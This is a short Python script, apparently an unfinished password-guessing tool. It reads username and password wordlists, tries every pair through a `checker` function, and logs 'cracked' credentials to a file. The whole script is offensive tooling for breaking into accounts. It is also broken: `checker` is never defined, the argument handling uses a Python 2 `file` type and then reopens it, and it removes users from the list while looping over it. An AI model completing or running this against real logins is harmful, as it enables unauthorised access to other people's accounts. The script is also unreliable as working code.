import argparse
import os
from bs4 import BeautifulSoup as bs
import requests

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--usernames", help="specify a file containing list of usernames", required=True, type=file)
    parser.add_argument("-p", "--passwords", help="specify a file containing list of passwords", required=True, type=file)
    args = parser.parse_args()
    opener(args.usernames, args.passwords)

#opener: u gussed it as the name implies open a list of usernames and passwords
#read them and save them to memory
def opener(user_list, pass_list):
    with open(user_list, "r") as f:
        usernames = f.readlines() # contains the list of usernames
    with open(pass_list, "r") as f:
        passwords = f.readlines() #contains the list of passwords
    cracker(usernames, passwords)

def cracker(usernames, passwords):
    with open("cracked_cred.dmd", "a") as f:
        print("Cracking...")
        for psswd in passwords:
            for user in usernames:
                cracked = checker(user, psswd)
                if cracked:
                    f.write(user+"::"+psswd+"\n")
                    print("found password for "+user+" ==> "+psswd)
                    usernames.remove(user)
    print("Exhausted the list of passwords")
